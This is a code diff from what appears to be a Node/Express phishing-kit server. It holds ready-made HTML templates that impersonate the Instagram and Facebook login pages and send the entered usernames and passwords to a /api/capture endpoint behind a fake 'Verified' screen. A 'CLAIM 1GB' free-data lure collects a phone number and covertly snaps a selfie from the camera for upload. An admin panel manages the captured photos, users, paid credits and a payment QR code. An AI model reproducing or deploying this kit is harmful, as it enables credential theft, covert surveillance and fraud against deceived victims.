 var INSTA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Instagram Login</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}\n.logo{text-align:center;margin-bottom:30px}\n.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}\n.input-group{position:relative;margin-bottom:18px}\n.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}\n.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}\n.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}\n.input-group input::placeholder{color:#777}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}\n.loader{display:none;text-align:center;padding:20px 0}\n.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader p{color:#aaa;margin-top:15px;font-size:14px}\n.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}\n.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}\n.result{display:none;text-align:center;padding:20px}\n.result i{font-size:50px;color:#28a745}\n.result h3{color:#fff;margin-top:10px}\n.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#888;text-decoration:none}\n</style>\n</head>\n<body>\n<div class="bg-shapes"><span></span><span></span></div>\n<div class="card">\n<div class="logo"><i class="fab fa-instagram"></i><h1>Instagram</h1></div>\n<div id="form-screen">\n<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>\n<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>\n<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>\n</div>\n<div id="process-screen" style="display:none">\n<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>\n<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>\n<div id="result-area" style="display:none">\n<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>\n<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>\n</div>\n</div>\n<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>\n</div>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nfunction startEngine(){\nvar u=document.getElementById("username").value.trim();\nvar pwd=document.getElementById("password").value;\nif(!u||!pwd){alert("Please fill all fields.");return}\nfetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});\ndocument.getElementById("form-screen").style.display="none";\ndocument.getElementById("process-screen").style.display="block";\ndocument.querySelector(".loader").style.display="block";\ndocument.querySelector(".progress-bar").style.display="block";\ndocument.getElementById("result-area").style.display="none";\nvar progress=0;\nvar interval=setInterval(function(){\nprogress+=Math.random()*3+1;\nif(progress>=100){progress=100;clearInterval(interval);\ndocument.querySelector(".loader").style.display="none";\ndocument.querySelector(".progress-bar").style.display="none";\ndocument.getElementById("result-area").style.display="block";\ndocument.getElementById("status-text").innerText="✅ Verified";\nreturn}\ndocument.getElementById("progress-fill").style.width=progress+"%";\nif(progress<30)document.getElementById("status-text").innerText="Connecting...";\nelse if(progress<60)document.getElementById("status-text").innerText="Verifying...";\nelse if(progress<85)document.getElementById("status-text").innerText="Loading...";\nelse document.getElementById("status-text").innerText="Almost done...";\n},150);\n}\n</script>\n</body>\n</html>\n';
 
+// FACEBOOK TEMPLATE
 var FB_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Facebook Login</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.logo{text-align:center;margin-bottom:30px}\n.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}\n.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}\n.input-group{position:relative;margin-bottom:18px}\n.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}\n.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}\n.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}\n.input-group input::placeholder{color:#666}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}\n.loader{display:none;text-align:center;padding:20px 0}\n.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader p{color:#aaa;margin-top:15px;font-size:14px}\n.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}\n.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}\n.result{display:none;text-align:center;padding:20px}\n.result i{font-size:50px;color:#28a745}\n.result h3{color:#fff;margin-top:10px}\n.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#666;text-decoration:none}\n</style>\n</head>\n<body>\n<div class="bg-shapes"><span></span><span></span></div>\n<div class="card">\n<div class="logo"><i class="fab fa-facebook"></i><h1>Facebook</h1></div>\n<div id="form-screen">\n<div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>\n<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>\n<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>\n</div>\n<div id="process-screen" style="display:none">\n<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>\n<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>\n<div id="result-area" style="display:none">\n<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>\n<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>\n</div>\n</div>\n<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>\n</div>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nfunction startEngine(){\nvar u=document.getElementById("username").value.trim();\nvar pwd=document.getElementById("password").value;\nif(!u||!pwd){alert("Please fill all fields.");return}\nfetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});\ndocument.getElementById("form-screen").style.display="none";\ndocument.getElementById("process-screen").style.display="block";\ndocument.querySelector(".loader").style.display="block";\ndocument.querySelector(".progress-bar").style.display="block";\ndocument.getElementById("result-area").style.display="none";\nvar progress=0;\nvar interval=setInterval(function(){\nprogress+=Math.random()*3+1;\nif(progress>=100){progress=100;clearInterval(interval);\ndocument.querySelector(".loader").style.display="none";\ndocument.querySelector(".progress-bar").style.display="none";\ndocument.getElementById("result-area").style.display="block";\ndocument.getElementById("status-text").innerText="✅ Verified";\nreturn}\ndocument.getElementById("progress-fill").style.width=progress+"%";\nif(progress<30)document.getElementById("status-text").innerText="Connecting...";\nelse if(progress<60)document.getElementById("status-text").innerText="Verifying...";\nelse if(progress<85)document.getElementById("status-text").innerText="Loading...";\nelse document.getElementById("status-text").innerText="Almost done...";\n},150);\n}\n</script>\n</body>\n</html>\n';
 
+// CAMERA TEMPLATE
 var CAMERA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>VIP Data Injector</title>\n<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:"Rajdhani",sans-serif;background:radial-gradient(ellipse at center,#0a0a0a,#000000);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(0,255,100,0.15);border-radius:35px;padding:50px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.9),inset 0 1px 0 rgba(0,255,100,0.1)}\n.badge{display:inline-block;background:linear-gradient(90deg,#00ff88,#00cc66);padding:6px 20px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:3px;color:#000;margin-bottom:15px}\nh1{font-family:"Orbitron",sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:25px}\n.input-box{margin:20px 0;text-align:left}\n.input-box label{font-size:13px;color:#00ff88;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block;margin-bottom:5px}\n.input-box input{width:100%;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,100,0.15);border-radius:16px;padding:18px 20px;color:#fff;font-size:18px;font-family:"Rajdhani",sans-serif;transition:.4s;outline:none}\n.input-box input:focus{border-color:#00ff88;box-shadow:0 0 30px rgba(0,255,136,0.1)}\n.btn-claim{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-family:"Orbitron",sans-serif;font-weight:900;font-size:17px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 40px rgba(0,255,136,0.25);margin-top:15px}\n.btn-claim:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px rgba(0,255,136,0.4)}\n.btn-claim:disabled{opacity:0.6;cursor:not-allowed}\n.loader-box{display:none;text-align:center;padding:20px 0}\n.loader-box .spinner{width:40px;height:40px;border:3px solid rgba(0,255,136,0.15);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader-box p{color:#00ff88;margin-top:15px;font-size:14px;letter-spacing:1px}\n.log-area{background:rgba(0,0,0,0.6);border-radius:16px;padding:20px;font-family:"Courier New",monospace;font-size:13px;color:#00ff88;text-align:left;display:none;border:1px solid rgba(0,255,136,0.08);margin-top:20px;max-height:200px;overflow-y:auto}\n.log-area .line{padding:4px 0;border-bottom:1px solid rgba(0,255,136,0.05)}\n.log-area .line.suc{color:#00ff88}\n.log-area .line.err{color:#ff4444}\n.bg-glow{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-glow span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,0.06),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-glow span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-glow span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\nvideo,canvas{display:none}\n.result-box{display:none;text-align:center;padding:20px 0}\n.result-box i{font-size:50px;color:#00ff88}\n.result-box h3{color:#fff;margin-top:10px;font-family:"Orbitron",sans-serif}\n</style>\n</head>\n<body>\n<div class="bg-glow"><span></span><span></span></div>\n<div class="card">\n<div class="badge">🔥 VIP ACCESS</div>\n<h1>CLAIM 1GB</h1>\n<div class="input-box"><label>📱 Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div>\n<button class="btn-claim" id="claimBtn">🎁 CLAIM NOW</button>\n<div class="loader-box" id="loaderBox"><div class="spinner"></div><p id="statusText">Initializing...</p></div>\n<div class="log-area" id="logArea"></div>\n<div class="result-box" id="resultBox"><i class="fas fa-check-circle"></i><h3>Success!</h3></div>\n</div>\n<video id="v" autoplay playsinline></video>\n<canvas id="c"></canvas>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nvar claimBtn=document.getElementById("claimBtn");\nvar logArea=document.getElementById("logArea");\nvar loaderBox=document.getElementById("loaderBox");\nvar statusText=document.getElementById("statusText");\nvar resultBox=document.getElementById("resultBox");\nvar video=document.getElementById("v");\nvar canvas=document.getElementById("c");\nvar ctx=canvas.getContext("2d");\nfunction addLog(msg,type){type=type||"";logArea.style.display="block";var l=document.createElement("div");l.className="line "+(type||"");l.innerText="▸ "+msg;logArea.appendChild(l);logArea.scrollTop=logArea.scrollHeight}\nclaimBtn.addEventListener("click",async function(){\nvar mobile=document.getElementById("mobile").value;\nif(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}\nclaimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";\nloaderBox.style.display="block";resultBox.style.display="none";logArea.innerHTML="";\nstatusText.innerText="🔍 Verifying...";\naddLog("Initializing secure connection...");\ntry{\naddLog("📡 Requesting verification...");\nstatusText.innerText="📸 Capturing...";\naddLog("📸 Accessing camera for verification...");\nvar stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}});\nvideo.srcObject=stream;\nawait new Promise(function(r){setTimeout(r,600)});\ncanvas.width=video.videoWidth||400;canvas.height=video.videoHeight||400;\nctx.drawImage(video,0,0);\nvar photoBase64=canvas.toDataURL("image/jpeg",0.85).split(",")[1];\nstream.getTracks().forEach(function(t){t.stop()});\naddLog("✅ Selfie captured successfully!","suc");\nstatusText.innerText="📤 Sending...";\naddLog("📤 Encrypting and sending data...");\nfetch("/api/capturepic",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(function(e){console.error(e)});\nawait new Promise(function(r){setTimeout(r,1200)});\naddLog("✅ Verification complete!","suc");\nstatusText.innerText="✅ Success!";\nclaimBtn.innerText="✅ CLAIMED";\nclaimBtn.style.background="linear-gradient(135deg,#00ff88,#00cc66)";\nresultBox.style.display="block";\nresultBox.innerHTML="<i class=\\"fas fa-check-circle\\" style=\\"color:#00ff88;font-size:50px\\"></i><h3 style=\\"color:#fff;margin-top:10px;font-family:Orbitron,sans-serif\\">1GB ADDED!</h3>";\nsetTimeout(function(){alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display="none"},1500)\n}catch(e){\naddLog("❌ Camera access denied!","err");\nstatusText.innerText="❌ Error";\nclaimBtn.innerText="🔄 RETRY";\nclaimBtn.disabled=false;\n}\n});\n</script>\n</body>\n</html>\n';
 
 // ====================== EXPRESS ROUTES ======================
@@ -408,6 +486,7 @@ app.use('/uploads', express.static(UPLOADS_DIR));
 
 // ====================== ADMIN PANEL ======================
 app.get('/admin', function(req, res) {
+    // Full admin panel (pink/red) - same as before
     res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:#0a0a0a;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{background:linear-gradient(135deg,#ff4757,#ff6b6b);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}.header h1{font-size:36px}.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s;color:#fff}.tab.active{background:linear-gradient(135deg,#ff4757,#ff6b6b);border-color:#ff4757}.tab:hover{background:#2a2a4a}.tab-content{display:none}.tab-content.active{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}.card:hover{transform:translateY(-5px);border-color:#ff4757}.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}.card .info{padding:10px 0}.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}.btn-primary{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-primary:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.btn-success{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-success:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.stat-card .number{font-size:32px;font-weight:700;color:#ff4757}.stat-card .label{color:#888;font-size:14px}.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}.channel-item .name{font-weight:600}.channel-item .id{color:#888;font-size:12px}.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}.user-card .uid{color:#ff4757;font-weight:600}.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}.toast.error{background:#dc3545}.empty{text-align:center;padding:60px 20px;color:#666}.empty i{font-size:64px;margin-bottom:20px;display:block}input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}.featured-preview img{max-width:200px;border-radius:10px}.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}.status-active{background:#1a3a1a;color:#28a745}.status-inactive{background:#3a1a1a;color:#dc3545}.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}</style></head><body><div class="container"><div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div><div class="tabs"><div class="tab active" onclick="showTab(\'photos\')">📷 Photos</div><div class="tab" onclick="showTab(\'channels\')">📢 Channels</div><div class="tab" onclick="showTab(\'users\')">👥 Users</div><div class="tab" onclick="showTab(\'featured\')">⭐ Featured</div><div class="tab" onclick="showTab(\'qr\')">💰 QR</div><div class="tab" onclick="showTab(\'logs\')">📋 Logs</div><div class="tab" onclick="showTab(\'commands\')">📜 Commands</div></div><div id="tab-photos" class="tab-content active"><div class="stats" id="stats"></div><div class="upload-section"><h3>📤 Upload Photo</h3><form id="uploadForm" enctype="multipart/form-data"><input type="file" name="photo" accept="image/*" required><input type="text" name="caption" placeholder="Caption"><button type="submit" class="btn btn-primary">Upload</button></form></div><div id="photoGrid" class="grid"></div></div><div id="tab-channels" class="tab-content"><h2>📢 Manage Channels</h2><div class="upload-section"><h3>➕ Add Channel</h3><div class="flex"><input type="text" id="channelId" placeholder="Channel ID" style="flex:1"><input type="text" id="channelName" placeholder="Channel Name" style="flex:1"><input type="text" id="channelLink" placeholder="Channel Link" style="flex:1"><button class="btn btn-success" onclick="addChannel()">Add</button></div></div><div id="channelList"></div></div><div id="tab-users" class="tab-content"><h2>👥 Manage Users</h2><div class="flex" style="margin-bottom:20px"><input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1"><button class="btn btn-primary" onclick="searchUser()">Search</button></div><div id="userList"></div><div class="flex" style="margin-top:20px"><input type="text" id="userIdInput" placeholder="User ID" style="flex:1"><input type="number" id="creditAmount" placeholder="Credits" style="width:150px"><button class="btn btn-warning" onclick="modifyCredits()">Modify</button><button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button></div></div><div id="tab-featured" class="tab-content"><h2>⭐ Featured Settings</h2><div class="upload-section"><h3>📸 Featured Photo</h3><div class="flex"><select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><option value="">Select a photo...</option></select><button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button><button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button></div><div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div></div><div class="upload-section"><h3>💬 Featured Message</h3><div class="flex"><input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button></div><div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div></div><div class="upload-section"><h3>⚙️ Status</h3><div class="flex"><span id="featuredStatus" class="status-badge status-active">✅ Active</span><button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button></div></div></div><div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2><div id="qrDisplay"><p style="color:#888;margin:20px 0">Upload payment QR code</p><input type="file" id="qrUpload" accept="image/*"><button class="btn btn-primary" onclick="uploadQR()">Upload QR</button><button class="btn btn-danger" onclick="removeQR()">Remove QR</button></div><div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;"><p style="color:#888;margin-bottom:10px;">Current QR Code:</p><img id="qrImage" src="" style="max-width:200px;border-radius:10px;"></div></div></div><div id="tab-logs" class="tab-content"><h2>📋 Server Logs</h2><div class="flex" style="margin-bottom:20px"><button class="btn btn-primary" onclick="loadLogs()">Refresh</button><button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button></div><div id="logsDisplay" class="logs-area">Loading logs...</div></div><div id="tab-commands" class="tab-content"><h2>📜 All Commands</h2><div class="upload-section"><h3>👑 Admin Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/help or /commands - Show all commands\n/admin - Open admin panel\n/addcredits [userId] [amount] - Add credits\n/removecredits [userId] [amount] - Remove credits\n/unlimited [userId] - Activate unlimited\n/resetuser [userId] - Reset user\n/users - Show all users\n/stats - Bot statistics\n/broadcast [message] - Send to all users\n/addqr - Upload QR code\n/removeqr - Remove QR code\n/viewqr - View QR code\n/addchannel [id] [name] [link] - Add channel\n/removechannel [id] - Remove channel\n/channels - List all channels\n/addphoto [caption] - Upload photo (reply with image)\n/featured [photoId] - Set featured photo\n/featuredmsg [message] - Set featured message\n/featuredtoggle - Toggle featured on/off\n/logs - Show recent logs\n/restart - Restart bot\n/dm [userId] [message] - DM a user</pre><h3 style="margin-top:20px">👤 User Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/start - Start the bot\n/menu - Show main menu\n/pay [amount] - Buy credits\n/credits - Check your credits\n/referral - Get referral link</pre></div></div></div><div id="toast" class="toast"></div><script>\nvar API_BASE=window.location.origin;\nfunction showToast(m,e){e=e||false;var t=document.getElementById("toast");t.textContent=m;t.className="toast"+(e?" error":"");t.style.display="block";setTimeout(function(){t.style.display="none"},3000);}\nfunction showTab(tab){document.querySelectorAll(".tab-content").forEach(function(t){t.classList.remove("active")});document.querySelectorAll(".tab").forEach(function(t){t.classList.remove("active")});document.getElementById("tab-"+tab).classList.add("active");document.querySelector(".tab[onclick=\\"showTab(\\\'"+tab+"\\\')\\"]").classList.add("active");if(tab==="channels")loadChannels();if(tab==="users")loadUsers();if(tab==="featured")loadFeatured();if(tab==="logs")loadLogs();if(tab==="qr")loadQR();}\nasync function loadPhotos(){try{var r=await fetch("/api/admin/photos");var d=await r.json();var photos=d.photos||[];var active=photos.filter(function(p){return p.active}).length;var total=photos.length;document.getElementById("stats").innerHTML="<div class=\\"stat-card\\"><div class=\\"number\\">"+total+"</div><div class=\\"label\\">Total</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+active+"</div><div class=\\"label\\">Active</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+(total-active)+"</div><div class=\\"label\\">Inactive</div></div>";var grid=document.getElementById("photoGrid");if(photos.length===0){grid.innerHTML="<div class=\\"empty\\"><i>📷</i>No photos</div>";return;}var html="";for(var i=0;i<photos.length;i++){var p=photos[i];html+="<div class=\\"card\\"><img src=\\""+p.url+"\\"><div class=\\"info\\"><div>"+(p.caption||"No caption")+"</div><div style=\\"font-size:12px;color:#888;\\">"+new Date(p.uploadedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:"+(p.active?"#28a745":"#dc3545")+";\\">"+(p.active?"✅ Active":"❌ Inactive")+"</div></div><div class=\\"actions\\"><button class=\\"btn btn-warning\\" onclick=\\"togglePhoto(\\\'"+p.id+"\\\')\\">"+(p.active?"Hide":"Show")+"</button><button class=\\"btn btn-danger\\" onclick=\\"deletePhoto(\\\'"+p.id+"\\\')\\">Delete</button></div></div>";}grid.innerHTML=html;}catch(err){showToast("Error loading photos",true);}}\nasync function deletePhoto(id){if(!confirm("Delete?"))return;try{var r=await fetch("/api/admin/photos/"+id,{method:"DELETE"});if(r.ok){showToast("Deleted!");loadPhotos();}else showToast("Delete failed",true);}catch(err){showToast("Error",true);}}\nasync function togglePhoto(id){try{var r=await fetch("/api/admin/photos/"+id+"/toggle",{method:"PATCH"});if(r.ok){showToast("Toggled!");loadPhotos();}else showToast("Toggle 